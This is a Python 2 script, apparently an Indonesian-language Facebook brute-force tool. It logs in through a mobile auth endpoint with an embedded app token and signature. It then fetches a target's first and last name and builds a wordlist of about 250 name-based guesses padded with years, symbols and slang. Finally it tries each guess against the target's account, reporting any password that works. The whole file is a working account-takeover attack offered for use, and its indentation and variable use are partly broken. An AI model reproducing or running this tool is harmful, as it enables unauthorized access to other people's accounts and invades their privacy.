# -*- coding: UTF-8 -*-
# Author: Iqbal Dev
# J A G A N   D I   C E C O D E   N J I N G

import os, sys, time, json, urllib, requests

try:
	import requests

except ImportError:

	os.system("pip2 install requests")

def runn(dev):
	for id in dev + '\n':
		sys.stdout.write(id)
		sys.stdout.flush()
		time.sleep(10. / 2200)

def banner():
	runn('''\033[36;1m
 
________                .__________   
\______ \   _______  __ |__\______ \  
 |    |  \_/ __ \  \/ / |  ||    |  \ 
 |    `   \  ___/\   /  |  ||    `   \
/_______  /\___  >\_/   |__/_______  /
        \/     \/                  \/ 

 \033[31;1m  D3v ID :).  /  [V.01]
''')
banner()


def login():

	try:

		token = open("login.txt", "r").read()

	except IOError:

	    username = raw_input(" [∆] Username : ")
	    password = raw_input(" [∆] Password : ")
	    urldev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+username+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
	    dev = urldev.content
	    jsl = json.loads(dev)

	    if "session_key" in dev:
		print 
		runn(" Berhasil login.........")
		open("login.txt", "w").write(jsl["access_token"])
		wordlist()

	    elif "www.facebook.com" in jsl["error_msg"]:
		print
		runn(" Akun Kena Cekpoint........")
		os.system("rm -f login.txt")
		sys.exit()

	    else:
		print 
		runn(" Login gagal.........")
		sys.exit()

	except:

	    print

	else:
	    wordlist()

def brute_fast():

	try:

	    token = open("login.txt", "r").read()

	except:

	    print 

	else:
	    try:
                email = target
                sandi = open("wordlist.txt", "r")
                san_dev = open("wordlist.txt", "r")
                for pas in san_dev:
                    pas = pas.replace("\n", "")
                    sys.stdout.write("\r Mencoba ==> " + pas)
                    sys.stdout.flush()
                    Dev_ID = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pas + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    dev = json.loads(Dev_ID.text)
                    if "access_token" in dev:
                        print
                        print " [OK∆] Found " + pas
                        sys.exit()

                    elif "www.facebook.com" in dev["error_msg"]:
                        print
                        print " [CP∆] Found " + pas
                        sys.exit()

                    else:
                        pass
            except:
    
              print
              print "Keluar"
    

def target():

	global target
	target = raw_input("[?] Masukkan ID Target : ")

def wordlist():

        
	try:
	    token = open('login.txt', 'r').read()

	except IOError, KeyError:

	    print " Error Silahkan Login lagi"
	    os.system('rm -f login.txt')

	else:

		target()
	#	target = raw_input("[?] Masukkan ID Target : ")
		
		urldev = requests.get('https://graph.facebook.com/' + target + '?access_token=' + token)
	        js = json.loads(urldev.text)

		pas1 = js["first_name"] + "123"
		pas2 = js["first_name"] + "12345"
		pas3 = js["first_name"] + "321"
		pas4 = js["first_name"] + "54321"
		pas5 = js["first_name"] + "1998"
		pas6 = js["first_name"] + "1999"
		pas7 = js["first_name"] + "2000"
		pas8 = js["first_name"] + "2001"
		pas9 = js["first_name"] + "2002"
		pas10 = js["first_name"] + "2003"
		pas11 = js["first_name"] + "2004"
		pas12 = js["first_name"] + "2005"
		pas13 = js["first_name"] + "2012"
		pas14 = js["first_name"]
		pas15 = js["first_name"] + "@"
		pas16 = js["first_name"] + "$"
		pas17 = js["first_name"] + "_"
		pas18 = js["first_name"] + "*"
		pas19 = js["first_name"] + "&"
		pas20 = js["first_name"] + "&&&"
		pas21 = js["first_name"] + "#"
		pas22 = js["first_name"] + "*"
		pas23 = js["first_name"] + "'"
		pas24 = js["first_name"] + ":"
		pas25 = js["first_name"] + ";"
		pas26 = js["first_name"] + "!"
		pas27 = js["first_name"] + "?"
		pas28 = js["first_name"] + "/"
		pas29 = js["first_name"] + ","
		pas30 = js["first_name"] + "."
		pas31 = js["first_name"] + "+"
		pas32 = js["first_name"] + "18+"
		pas33 = js["first_name"] + "@@"
		pas34 = js["first_name"] + "@@@"
		pas35 = js["first_name"] + "@.@"
		pas36 = js["first_name"] + "@*@"
		pas37 = js["first_name"] + "@#$"
		pas38 = js["first_name"] + "@&"
		pas39 = js["first_name"] + "@123"
		pas40 = js["first_name"] + "@12345"
		pas41 = js["first_name"] + "@su"
		pas42 = js["first_name"] + "@njing"
		pas43 = js["first_name"] + "sayang"
		pas44 = js["first_name"] + "love"
		pas45 = js["first_name"] + "lope"
		pas46 = js["first_name"] + "cantik"
		pas47 = js["first_name"] + "ganteng"
		pas48 = js["first_name"] + "cans"
		pas49 = js["first_name"] + "ml"
		pas50 = js["first_name"] + "pubg"
		pas51 = js["first_name"] + "lonte"
		pas52 = js["first_name"] + "tai"
		pas53 = js["first_name"] + "anjing"
		pas54 = js["first_name"] + "bangsat"
		pas55 = js["first_name"] + "kontol"
		pas56 = js["first_name"] + "nob"
		pas57 = js["first_name"] + "noob"
                pas58 = js["first_name"] + "pro"
		pas59 = js["first_name"] + "kun"
		pas60 = js["first_name"] + "bajingan"
		pas61 = js["first_name"] + "new"
		pas62 = js["first_name"] + "koplok"
		pas63 = js["first_name"] + "jancok"
		pas64 = js["first_name"] + "jr"
		pas65 = js["first_name"] + "jos"
		pas66 = js["first_name"] + "0"
		pas67 = js["first_name"] + "00"
		pas68 = js["first_name"] + "01"
		pas69 = js["first_name"] + "000"
		pas70 = js["first_name"] + "011"
		pas71 = js["first_name"] + "222"
		pas72 = js["first_name"] + "111"
		pas73 = js["first_name"] + "333"
		pas74 = js["first_name"] + "*123#"
		pas75 = js["first_name"] + "kecil"
		pas76 = js["first_name"] + "lucu"
		pas77 = js["first_name"] + "sukses"
		pas78 = js["first_name"] + "gaming"
		pas79 = js["first_name"] + "%"
		pas80 = js["first_name"] + "100%"
		pas81 = js["first_name"] + "1000%"
		pas82 = js["first_name"] + "gamer"
		pas83 = js["first_name"] + "gamers"
		pas84 = "@" + js["first_name"]
		pas85 = "@" + js["first_name"] + "123"
		pas86 = "@" + js["first_name"] + "1234"
		pas87 = "@" + js["first_name"] + "12345"
		pas88 = "@" + js["first_name"] + "@"
		pas89 = "@" + js["first_name"] + "cantik"
		pas90 = "*" + js["first_name"] + "*"
		pas91 = "*" + js["first_name"] + "#"
		pas92 = "*" + js["first_name"] + "123*"
		pas93 = "*" + js["first_name"] + "123#"
		pas94 = "#" + js["first_name"] 
		pas95 = "#" + js["first_name"] + "123"
		pas96 = "#" + js["first_name"] + "#"
		pas97 = "#" + js["first_name"] + "123#"
		pas98 = "(" + js["first_name"] + ")"
		pas99 = "(" + js["first_name"] + "123)"
		pas100 = js["first_name"] + "_123"
		pas101 = js["first_name"] + "_1234"
		pas102 = js["first_name"] + "_12345"
		pas103 = js["first_name"] + "*#"
		pas104 = js["first_name"] + "#*"
		pas105 = js["first_name"] + "@_@"
		pas106 = js["first_name"] + "#_#"
		pas107 = js["first_name"] + "$_$"
		pas108 = js["first_name"] + "#.#"

		pas109 = js["last_name"] + "123"
                pas110 = js["last_name"] + "12345"
                pas111 = js["last_name"] + "321"
                pas112 = js["last_name"] + "54321"
                pas113 = js["last_name"] + "1998"
                pas114 = js["last_name"] + "1999"
                pas115 = js["last_name"] + "2000"
                pas116 = js["last_name"] + "2001"
                pas117 = js["last_name"] + "2002"
                pas118 = js["last_name"] + "2003"
                pas119 = js["last_name"] + "2004"
                pas120 = js["last_name"] + "2005"
                pas121 = js["last_name"] + "2012"
                pas122 = js["last_name"]
                pas123 = js["last_name"] + "@"
                pas124 = js["last_name"] + "$"
                pas125 = js["last_name"] + "_"
                pas126 = js["last_name"] + "*"
                pas127 = js["last_name"] + "&"
                pas128 = js["last_name"] + "&&"
                pas129 = js["last_name"] + "#"
                pas130 = js["last_name"] + "*"
                pas131 = js["last_name"] + "'"
                pas132 = js["last_name"] + ":"
                pas133 = js["last_name"] + ";"
                pas134 = js["last_name"] + "!"
                pas135 = js["last_name"] + "?"
                pas136 = js["last_name"] + "/"
                pas137 = js["last_name"] + ","
                pas138 = js["last_name"] + "."
                pas139 = js["last_name"] + "+"
                pas140 = js["last_name"] + "18+"
                pas141 = js["last_name"] + "@@"
                pas142 = js["last_name"] + "@@@"
                pas143 = js["last_name"] + "@.@"
#±±++++++++++±++++±
                pas144 = js["last_name"] + "@*@"
                pas145 = js["last_name"] + "@#$"
                pas146 = js["last_name"] + "@&"
                pas147 = js["last_name"] + "@123"
                pas148 = js["last_name"] + "@12345"
                pas149 = js["last_name"] + "@su"
                pas150 = js["last_name"] + "@njing"
                pas151 = js["last_name"] + "sayang"
                pas152 = js["last_name"] + "love"
                pas153 = js["last_name"] + "lope"
                pas154 = js["last_name"] + "cantik"
                pas155 = js["last_name"] + "ganteng"
                pas156 = js["last_name"] + "cans"
                pas157 = js["last_name"] + "ml"
                pas158 = js["last_name"] + "pubg"
                pas159 = js["last_name"] + "lonte"
                pas160 = js["last_name"] + "tai"
                pas161 = js["last_name"] + "anjing"
                pas162 = js["last_name"] + "bangsat"
                pas163 = js["last_name"] + "kontol"
                pas164 = js["last_name"] + "nob"
                pas165 = js["last_name"] + "noob"
                pas166 = js["last_name"] + "pro"
                pas167 = js["last_name"] + "kun"
                pas168 = js["last_name"] + "bajingan"
                pas169 = js["last_name"] + "new"
                pas170 = js["last_name"] + "koplok"
                pas171 = js["last_name"] + "jancok"
                pas172 = js["last_name"] + "jr"
                pas173 = js["last_name"] + "jos"
                pas174 = js["last_name"] + "0"
                pas175 = js["last_name"] + "00"
                pas176 = js["last_name"] + "01"
                pas177 = js["last_name"] + "000"
                pas178 = js["last_name"] + "011"
                pas179 = js["last_name"] + "222"
                pas180 = js["last_name"] + "111"

######
                pas181 = js["last_name"] + "333"
                pas182 = js["last_name"] + "*123#"
                pas183 = js["last_name"] + "kecil"
                pas184 = js["last_name"] + "lucu"
                pas185 = js["last_name"] + "sukses"
                pas186 = js["last_name"] + "gaming"
                pas187 = js["last_name"] + "%"
                pas188 = js["last_name"] + "100%"
                pas189 = js["last_name"] + "1000%"
                pas190 = js["last_name"] + "gamer"
                pas191 = js["last_name"] + "gamers"
                pas192 = "@" + js["last_name"]
                pas193 = "@" + js["last_name"] + "123"
                pas194 = "@" + js["last_name"] + "1234"
                pas195 = "@" + js["last_name"] + "12345"
                pas196 = "@" + js["last_name"] + "@"
                pas197 = "@" + js["last_name"] + "cantik"
                pas198 = "*" + js["last_name"] + "*"
                pas199 = "*" + js["last_name"] + "#"
                pas200 = "*" + js["last_name"] + "123*"
                pas201 = "*" + js["last_name"] + "123#"
                pas202 = "#" + js["last_name"] 
                pas203 = "#" + js["last_name"] + "123"
                pas204 = "#" + js["last_name"] + "#"
                pas205 = "#" + js["last_name"] + "123#"
                pas206 = "(" + js["last_name"] + ")"
                pas207 = "(" + js["last_name"] + "123)"
		pas208 = js["last_name"] + "_123"
                pas209 = js["last_name"] + "_1234"
                pas210 = js["last_name"] + "_12345"
                pas211 = js["last_name"] + "*#"
                pas212 = js["last_name"] + "#*"
		pas213 = js["last_name"] + "@_@"
                pas214 = js["last_name"] + "#_#"
                pas215 = js["last_name"] + "$_$"
                pas216 = js["last_name"] + "#.#"

		pas217 = js["first_name"] + "_#"
                pas218 = js["first_name"] + "*.*"
                pas219 = js["first_name"] + "*_*"
                pas220 = js["first_name"] + "*@*"
                pas221 = js["first_name"] + "*&*"
                pas222 = js["first_name"] + "*$*"
                pas223 = js["first_name"] + "@$u"
                pas224 = js["first_name"] + "v:"
                pas225 = js["first_name"] + ":v"

		pas226 = js["last_name"] + "_#"
                pas227 = js["last_name"] + "*.*"
                pas228 = js["last_name"] + "*_*"
                pas229 = js["last_name"] + "*@*"
                pas230 = js["last_name"] + "*&*"
                pas231 = js["last_name"] + "*$*"
                pas231 = js["last_name"] + "@$u"
                pas232 = js["last_name"] + "v:"
                pas233 = js["last_name"] + ":v"

		pas234 = js["first_name"] + "123*"
                pas235 = js["first_name"] + "1234*"
                pas236 = js["first_name"] + "12345*"
                pas237 = js["first_name"] + "12345#"
                pas238 = js["first_name"] + "gemes"
                pas239 = js["first_name"] + "gemez"
                pas240 = js["first_name"] + "imut"
                pas241 = js["first_name"] + "imut*"
                pas242 = js["first_name"] + "imut123"

		pas243 = js["last_name"] + "123*"
                pas244 = js["last_name"] + "1234*"
                pas245 = js["last_name"] + "12345*"
                pas246 = js["last_name"] + "12345#"
                pas247 = js["last_name"] + "gemes"
                pas248 = js["last_name"] + "gemez"
                pas249 = js["last_name"] + "imut"
                pas250 = js["last_name"] + "imut*"
                pas251 = js["last_name"] + "imut123"
		pas252 = js["first_name"] + "123#"
		pas253 = js["last_name"] + "123#"

		file = open("wordlist.txt", "w")
		b = "\n"
		file.write("bangsat"+b +"anjing"+b)
		file.write(pas1+b +pas2+b +pas3+b +pas4+b +pas5+b +pas6+b +pas7+b +pas8+b +pas9+b +pas10+b)
		file.write(pas11+b +pas12+b +pas13+b +pas14+b +pas15+b +pas16+b +pas17+b +pas18+b +pas19+b +pas20+b)
		file.write(pas21+b +pas22+b +pas23+b +pas24+b +pas25+b +pas26+b +pas27+b +pas28+b +pas29+b +pas30+b)
		file.write(pas31+b +pas32+b +pas33+b +pas34+b +pas35+b +pas36+b +pas37+b +pas38+b +pas39+b +pas40+b)
		file.write(pas41+b +pas42+b +pas43+b +pas44+b +pas45+b +pas46+b +pas47+b +pas48+b +pas49+b +pas50+b)


		file.write(pas51+b +pas52+b +pas53+b +pas54+b +pas55+b +pas56+b +pas57+b +pas58+b +pas59+b +pas60+b)
                file.write(pas61+b +pas62+b +pas63+b +pas64+b +pas65+b +pas66+b +pas67+b +pas68+b +pas69+b +pas70+b)
                file.write(pas71+b +pas72+b +pas73+b +pas74+b +pas75+b +pas76+b +pas77+b +pas78+b +pas79+b +pas80+b)
                file.write(pas81+b +pas82+b +pas83+b +pas84+b +pas85+b +pas86+b +pas87+b +pas88+b +pas89+b +pas90+b)
                file.write(pas91+b +pas92+b +pas93+b +pas94+b +pas95+b +pas96+b +pas97+b +pas98+b +pas99+b +pas100+b)

		file.write(pas101+b +pas102+b +pas103+b +pas104+b +pas105+b +pas106+b +pas107+b +pas108+b +pas109+b +pas110+b)
                file.write(pas111+b +pas112+b +pas113+b +pas114+b +pas115+b +pas116+b +pas117+b +pas118+b +pas119+b +pas120+b)
                file.write(pas121+b +pas122+b +pas123+b +pas124+b +pas125+b +pas126+b +pas127+b +pas128+b +pas129+b +pas130+b)
                file.write(pas131+b +pas132+b +pas133+b +pas134+b +pas135+b +pas136+b +pas137+b +pas138+b +pas139+b +pas140+b)
                file.write(pas141+b +pas142+b +pas143+b +pas144+b +pas145+b +pas146+b +pas147+b +pas148+b +pas149+b +pas150+b)

		file.write(pas151+b +pas152+b +pas153+b +pas154+b +pas155+b +pas156+b +pas157+b +pas158+b +pas159+b +pas160+b)
                file.write(pas161+b +pas162+b +pas163+b +pas164+b +pas165+b +pas166+b +pas167+b +pas168+b +pas169+b +pas170+b)
                file.write(pas171+b +pas172+b +pas173+b +pas174+b +pas175+b +pas176+b +pas177+b +pas178+b +pas179+b +pas180+b)
                file.write(pas181+b +pas182+b +pas183+b +pas184+b +pas185+b +pas186+b +pas187+b +pas188+b +pas189+b +pas190+b)
                file.write(pas191+b +pas192+b +pas193+b +pas194+b +pas195+b +pas196+b +pas197+b +pas198+b +pas199+b +pas200+b)

		file.write(pas201+b +pas202+b +pas203+b +pas204+b +pas205+b +pas206+b +pas207+b +pas208+b +pas209+b +pas210+b)
                file.write(pas211+b +pas212+b +pas213+b +pas214+b +pas215+b +pas216+b +pas217+b +pas218+b +pas219+b +pas220+b)
		file.write(pas221+b +pas222+b +pas223+b +pas224+b +pas225+b +pas226+b +pas227+b +pas228+b +pas229+b +pas230+b)
                file.write(pas231+b +pas232+b +pas233+b +pas234+b +pas235+b +pas236+b +pas237+b +pas238+b +pas239+b +pas240+b)

		file.write(pas241+b +pas242+b +pas243+b +pas244+b +pas245+b +pas246+b +pas247+b +pas248+b +pas249+b +pas250+b)
                file.write(pas251+b +pas252+b +pas253+b)
		file.close()
                print
		print " Sukses mengambil informasi"
		brute_fast()


def coba():

	data = open("word1.txt", "w")
	a = "haha"
	b = "ssssss"
	c = "&&&&&&"
	h = "\n"
	data.write(a+h + b +h + c)
	data.close()

def main():
	login()
	
if __name__ == "__main__":
	main()
